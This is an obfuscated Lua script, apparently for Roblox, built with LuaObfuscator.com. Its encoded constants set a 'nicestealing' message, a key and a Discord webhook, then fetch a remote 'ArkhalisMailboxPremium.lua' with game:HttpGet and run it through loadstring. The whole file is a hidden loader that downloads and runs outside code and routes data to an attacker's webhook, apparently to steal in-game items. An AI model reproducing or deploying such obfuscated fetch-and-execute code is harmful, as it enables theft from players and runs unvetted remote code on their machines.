--[[

 .____                  ________ ___.    _____                           __                

 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 

 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \

 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/

 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   

         \/          \/         \/    \/                \/     \/     \/                   

          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=0;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;while true do if (2==v18) then function v22()local v31=v1(v16,v19,v19);v19=v19 + 1 ;return v31;end v23=nil;function v23()local v32,v33=v1(v16,v19,v19 + (5 -3) );v19=v19 + 2 ;return (v33 * (732 -476)) + v32 ;end v18=3;end if (0==v18) then v19=1;v20=nil;v16=v4(v3(v16,5),"..",function(v34)if (v1(v34,2)==79) then v20=v0(v3(v34,1,1));return "";else local v70=0;local v71;while true do if (v70==0) then v71=v2(v0(v34,16));if v20 then local v98=v5(v71,v20);v20=nil;return v98;else return v71;end break;end end end end);v18=1;end if (v18==7) then function v30(v35,v36,v37)local v38=0;local v39;local v40;local v41;while true do if (v38==1) then v41=v35[3];return function(...)local v78=v39;local v79=v40;local v80=v41;local v81=v28;local v82=1;local v83= -1;local v84={};local v85={...};local v86=v12("#",...) -1 ;local v87={};local v88={};for v94=0,v86 do if (v94>=v80) then v84[v94-v80 ]=v85[v94 + 1 ];else v88[v94]=v85[v94 + 1 ];end end local v89=(v86-v80) + 1 ;local v90;local v91;while true do v90=v78[v82];v91=v90[1];if (v91<=5) then if (v91<=2) then if (v91<=0) then local v107=v90[2];local v108=v88[v90[3]];v88[v107 + 1 ]=v108;v88[v107]=v108[v90[4]];elseif (v91>1) then if (v88[v90[2]]==v90[4]) then v82=v82 + 1 ;else v82=v90[3];end else local v121;local v122,v123;local v124;local v125;v88[v90[2]][v90[3]]=v90[4];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v37[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v37[v90[3]];v82=v82 + 1 ;v90=v78[v82];v125=v90[2];v124=v88[v90[3]];v88[v125 + 1 ]=v124;v88[v125]=v124[v90[4]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v125=v90[2];v122,v123=v81(v88[v125](v13(v88,v125 + 1 ,v90[3])));v83=(v123 + v125) -1 ;v121=0;for v147=v125,v83 do local v148=0;while true do if (0==v148) then v121=v121 + 1 ;v88[v147]=v122[v121];break;end end end v82=v82 + 1 ;v90=v78[v82];v125=v90[2];v88[v125]=v88[v125](v13(v88,v125 + 1 ,v83));v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]();v82=v82 + 1 ;v90=v78[v82];v82=v90[3];end elseif (v91<=3) then for v117=v90[2],v90[3] do v88[v117]=nil;end elseif (v91>4) then v88[v90[2]]();else local v137=v90[2];v88[v137]=v88[v137](v13(v88,v137 + 1 ,v83));end elseif (v91<=8) then if (v91<=6) then local v112=0;local v113;local v114;local v115;local v116;while true do if (v112==1) then v83=(v115 + v113) -1 ;v116=0;v112=2;end if (v112==2) then for v151=v113,v83 do local v152=0;while true do if (v152==0) then v116=v116 + 1 ;v88[v151]=v114[v116];break;end end end break;end if (v112==0) then v113=v90[2];v114,v115=v81(v88[v113](v13(v88,v113 + 1 ,v90[3])));v112=1;end end elseif (v91>7) then v88[v90[2]]=v90[3];else local v141=0;while true do if (v141==2) then v88[v90[2]][v90[3]]=v90[4];v82=v82 + 1 ;v90=v78[v82];v141=3;end if (3==v141) then v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v141=4;end if (v141==1) then v88[v90[2]]=v37[v90[3]];v82=v82 + 1 ;v90=v78[v82];v141=2;end if (v141==4) then v82=v90[3];break;end if (v141==0) then v88[v90[2]][v90[3]]=v90[4];v82=v82 + 1 ;v90=v78[v82];v141=1;end end end elseif (v91<=10) then if (v91>9) then v82=v90[3];else do return;end end elseif (v91>11) then v88[v90[2]][v90[3]]=v90[4];else v88[v90[2]]=v37[v90[3]];end v82=v82 + 1 ;end end;end if (v38==0) then v39=v35[1];v40=v35[2];v38=1;end end end return v30(v29(),{},v17)(...);end if (v18==4) then function v25()local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(4 -2)) then v47=v21(v44,640 -(555 + 64) ,31);v48=((v21(v44,(707 + 256) -(857 + (294 -220)) )==(569 -((900 -533) + 201))) and  -(928 -(214 + 713))) or (1 + 0) ;v42=3;end if ((1 + 0)==v42) then v45=1;v46=(v21(v44,878 -(282 + 595) ,20) * ((1639 -(1523 + 114))^32)) + v43 ;v42=2 + 0 ;end if (v42==(0 -0)) then v43=v24();v44=v24();v42=1;end if (v42==3) then if (v47==0) then if (v46==(1065 -(68 + 997))) then return v48 * (1270 -(226 + 1044)) ;else local v103=0 -(952 -(802 + 150)) ;while true do if (v103==0) then v47=118 -(32 + 85) ;v45=0 + 0 ;break;end end end elseif (v47==(454 + 1593)) then return ((v46==((2576 -1619) -(892 + 65))) and (v48 * ((2 -1)/((0 -0) -0)))) or (v48 * NaN) ;end return v8(v48,v47-(1877 -854) ) * (v45 + (v46/((352 -(87 + 263))^(232 -(50 + 17 + 113))))) ;end end end v26=nil;function v26(v49)local v50=(438 -(145 + 293)) + 0 ;local v51;local v52;while true do if (v50==(997 -(915 + 82))) then v51=nil;if  not v49 then local v97=(430 -(44 + 386)) -0 ;while true do if (v97==(0 -0)) then v49=v24();if (v49==(1486 -(998 + 488))) then return "";end break;end end end v50=19 -(4 + 6 + 8) ;end if ((2 + 1)==v50) then return v6(v52);end if (v50==(1 -0)) then v51=v3(v16,v19,(v19 + v49) -((363 + 80) -(416 + 26)) );v19=v19 + v49 ;v50=1189 -(1069 + 118) ;end if (((776 -(201 + 571)) -2)==v50) then v52={};for v92=1 -0 , #v51 do v52[v92]=v2(v1(v3(v51,v92,v92)));end v50=1 + 2 ;end end end v18=5;end if (v18==3) then v24=nil;function v24()local v53=1138 -(116 + 1022) ;local v54;local v55;local v56;local v57;while true do if (v53==(859 -(814 + 45))) then v54,v55,v56,v57=v1(v16,v19,v19 + 3 );v19=v19 + ((1089 -(1020 + 60)) -5) ;v53=4 -(1426 -(630 + 793)) ;end if (v53==(1 + 0)) then return (v57 * (61248424 -44471208)) + (v56 * 65536) + (v55 * (909 -653)) + v54 ;end end end v25=nil;v18=4;end if (v18==1) then v21=nil;function v21(v58,v59,v60)if v60 then local v72=(v58/((6 -(1 + 3))^(v59-(4 -3))))%((1 + 1)^(((v60-(3 -(2 + 0))) -(v59-(1748 -(760 + 987)))) + (1914 -(1789 + 124)))) ;return v72-(v72%(767 -(745 + 21))) ;else local v73=0 + 0 ;local v74;while true do if (v73==0) then v74=(5 -(1058 -(87 + 968)))^(v59-(3 -2)) ;return (((v58%(v74 + v74))>=v74) and 1) or 0 ;end end end end v22=nil;v18=2;end if (v18==6) then v29=nil;function v29()local v61=0 -0 ;local v62;local v63;local v64;local v65;local v66;local v67;while true do local v68=0;local v69;while true do if (v68==(0 + 0)) then v69=0;while true do if (v69==(1 + 0)) then if ((0 -0)==v61) then local v105=0;local v106;while true do if (v105==(1274 -(388 + 886))) then v106=0 -0 ;while true do if (v106==1) then local v153=0;while true do if ((0 + 0)~=v153) then else v64={};v65={v62,v63,nil,v64};v153=1 -0 ;end if (v153~=(1468 -(899 + 568))) then else v106=2;break;end end end if (v106~=2) then else v61=1 + 0 ;break;end if ((0 -0)==v106) then local v154=0;while true do if (v154~=(604 -(268 + 335))) then else v106=1;break;end if (v154~=(290 -(60 + 230))) then else v62={};v63={};v154=573 -(426 + 146) ;end end end end break;end end end break;end if ((0 + 0)==v69) then local v104=0;while true do if (v104~=0) then else if (v61==(1457 -(282 + 1174))) then local v119=811 -(569 + 242) ;while true do if (v119==1) then for v169=2 -1 ,v66 do local v170=0;local v171;local v172;while true do if (v170==(0 + 0)) then local v183=1024 -(706 + 318) ;while true do if (v183~=(1252 -(721 + 530))) then else v170=1272 -(945 + 326) ;break;end if (v183~=(0 -0)) then else v171=v22();v172=nil;v183=1 + 0 ;end end end if (v170==1) then if (v171==1) then v172=v22()~=0 ;elseif (v171==(702 -(271 + 429))) then v172=v25();elseif (v171~=3) then else v172=v26();end v67[v169]=v172;break;end end end v65[3 + 0 ]=v22();v119=2;end if ((1502 -(1408 + 92))~=v119) then else v61=2;break;end if (0==v119) then v66=v24();v67={};v119=1;end end end if (v61==(1088 -(461 + 625))) then local v120=1288 -(993 + 295) ;while true do if (v120==0) then for v173=1 + 0 ,v24() do local v174=0;local v175;local v176;while true do if (v174==0) then local v185=0;while true do if (v185~=(1172 -(418 + 753))) then else v174=1;break;end if (v185~=(0 + 0)) then else local v186=0 + 0 ;while true do if (v186==(1 + 0)) then v185=1;break;end if (v186==(0 + 0)) then v175=529 -(406 + 123) ;v176=nil;v186=1770 -(1749 + 20) ;end end end end end if (v174~=1) then else while true do if (v175==(0 + 0)) then v176=v22();if (v21(v176,1,1)==(1322 -(1249 + 73))) then local v187=0 + 0 ;local v188;local v189;local v190;local v191;local v192;while true do if ((1145 -(466 + 679))~=v187) then else v188=0 -0 ;v189=nil;v187=2 -1 ;end if (v187~=(1901 -(106 + 1794))) then else v190=nil;v191=nil;v187=2;end if (v187~=(1 + 1)) then else v192=nil;while true do if (v188==(1 + 0)) then local v193=0;while true do if (v193==1) then v188=2;break;end if (v193==(0 -0)) then v191=nil;v192=nil;v193=1;end end end if (v188==(0 -0)) then v189=114 -(4 + 110) ;v190=nil;v188=1;end if (v188==(586 -(57 + 527))) then while true do if (v189~=(1429 -(41 + 1386))) then else local v194=0;local v195;while true do if (v194==(103 -(17 + 86))) then v195=0 + 0 ;while true do if (v195==1) then v189=6 -3 ;break;end if (v195==0) then local v205=0;while true do if (v205~=1) then else v195=1;break;end if ((0 -0)==v205) then if (v21(v191,167 -(122 + 44) ,1 -0 )==1) then v192[6 -4 ]=v67[v192[2 + 0 ]];end if (v21(v191,1 + 1 ,2)==(1 -0)) then v192[68 -(30 + 35) ]=v67[v192[3]];end v205=1 + 0 ;end end end end break;end end end if (v189==(1260 -(1043 + 214))) then if (v21(v191,11 -8 ,1215 -(323 + 889) )~=1) then else v192[4]=v67[v192[10 -6 ]];end v62[v173]=v192;break;end if (v189==(580 -(361 + 219))) then local v197=0;local v198;local v199;while true do if ((320 -(53 + 267))~=v197) then else v198=0 + 0 ;v199=nil;v197=1;end if (v197==1) then while true do if (v198==(413 -(15 + 398))) then v199=982 -(18 + 964) ;while true do if (v199~=0) then else local v206=0;while true do if (v206==(3 -2)) then v199=1 + 0 ;break;end if (v206==(0 + 0)) then v190=v21(v176,852 -(20 + 830) ,3 + 0 );v191=v21(v176,130 -(116 + 10) ,6);v206=1;end end end if (v199==1) then v189=1 + 0 ;break;end end break;end end break;end end end if (v189~=1) then else local v200=0;local v201;local v202;while true do if (v200==1) then while true do if (v201==(738 -(542 + 196))) then v202=0 -0 ;while true do if (v202==(1 + 0)) then v189=2 + 0 ;break;end if (v202==(0 + 0)) then v192={v23(),v23(),nil,nil};if (v190==0) then local v211=405 -(118 + 287) ;local v212;while true do if (v211~=0) then else v212=0 -0 ;while true do if (v212==(1121 -(118 + 1003))) then v192[8 -5 ]=v23();v192[381 -(142 + 235) ]=v23();break;end end break;end end elseif (v190==1) then v192[13 -10 ]=v24();elseif (v190==(1 + 1)) then v192[3]=v24() -(2^16) ;elseif (v190==3) then local v217=977 -(553 + 424) ;local v218;while true do if (v217==0) then v218=0;while true do if (v218~=(0 -0)) then else v192[3 + 0 ]=v24() -((2 + 0)^(10 + 6)) ;v192[4]=v23();break;end end break;end end end v202=1 + 0 ;end end break;end end break;end if (v200==0) then v201=0 + 0 ;v202=nil;v200=2 -1 ;end end end end break;end end break;end end end break;end end break;end end end for v177=1,v24() do v63[v177-1 ]=v29();end v120=2 -1 ;end if (v120==1) then return v65;end end end v104=2 -1 ;end if (v104==(1 + 0)) then v69=1;break;end end end end break;end end end end v30=nil;v18=7;end if (v18==5) then v27=v24;v28=nil;function v28(...)return {...},v12("#",...);end v18=6;end end end v15("LOL!0D3O00028O00026O00F03F03023O005F47030B3O0053656E644D652O73616765030E3O006E696365737465616C696E672O47030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403383O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F41726B68616C69734D61696C626F785072656D69756D2E6C75612O033O004B657903153O0041726B68616C69732D4C4E4F55444F594257494D45030F3O00576562682O6F6B4475616C482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3130373931383931343730363438313231342F714B51483070452O346A313064464A30765A716A4158573336793541435F682D756A6678772D6A526D6F3361354E6356396B72796C4C67494A79494238334265454B697800243O0012083O00014O0003000100013O0026023O00020001000100040A3O00020001001208000100013O002602000100110001000200040A3O0011000100120B000200033O00300100020004000500122O000200063O00122O000300073O00202O00030003000800122O000500096O000300056O00023O00024O00020001000100044O00230001002602000100050001000100040A3O00050001001208000200013O002602000200180001000200040A3O00180001001208000100023O00040A3O00050001002602000200140001000100040A3O0014000100120B000300033O0030070003000A000B00122O000300033O00302O0003000C000D00122O000200023O00044O0014000100040A3O0005000100040A3O0023000100040A3O000200012O00093O00017O00",v9(),...);end
